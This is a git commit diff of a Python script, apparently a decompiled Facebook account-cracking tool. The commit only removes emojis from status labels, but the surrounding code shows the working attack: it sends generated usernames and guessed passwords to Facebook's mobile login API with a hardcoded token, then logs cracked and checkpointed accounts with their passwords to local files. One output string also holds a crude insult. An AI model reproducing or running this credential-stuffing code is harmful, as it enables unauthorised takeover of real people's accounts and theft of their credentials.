4c520982978caf28e069ea231e006854c36d4037
kazi samir <97796921+kazisamir4@users.noreply.github.com>
2022-07-29 12:09:41 +0600

    Update Fucksamir.py

--- Fucksamir.py
+++ Fucksamir.py
@@ -243,13 +243,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[samir✌_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[samir_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[samir😘_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [khankir pola 7 din por login dibi]\x1b[0m \n'
+                print '\x1b[1;96m[samir_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [khankir pola 7 din por login dibi]\x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
@@ -271,5 +271,5 @@ def action():
  
 if __name__ == '__main__':
     menu()
-# okay decompiling samirbd11.py
+# okay decompiling talhabd11.pyc
 
